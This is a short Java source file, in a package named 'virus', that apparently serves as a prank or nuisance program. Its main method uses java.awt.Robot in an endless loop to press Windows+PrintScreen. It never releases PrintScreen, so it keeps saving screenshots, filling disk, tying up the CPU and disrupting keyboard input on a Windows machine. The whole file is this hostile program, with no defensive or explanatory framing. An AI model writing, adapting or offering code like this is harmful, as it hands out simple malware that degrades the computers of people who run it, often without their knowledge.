/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package virus;

/**
 *
 * @author hp
 */
import java.awt.Robot;
import java.awt.event.KeyEvent;
public class ScreenshotV {
    public static void main(String args[])
    {
        try
        {
            while(true)
            {
                Robot r=new Robot();
                r.keyPress(KeyEvent.VK_WINDOWS);
                r.keyPress(KeyEvent.VK_PRINTSCREEN);
                r.keyRelease(KeyEvent.VK_WINDOWS);
                //r.KeyRelease(KeyEvent.VK_PRINTSCREEN);
            }
        }
        catch(Exception e)
        {
            System.out.println(e);
        }
    }
}
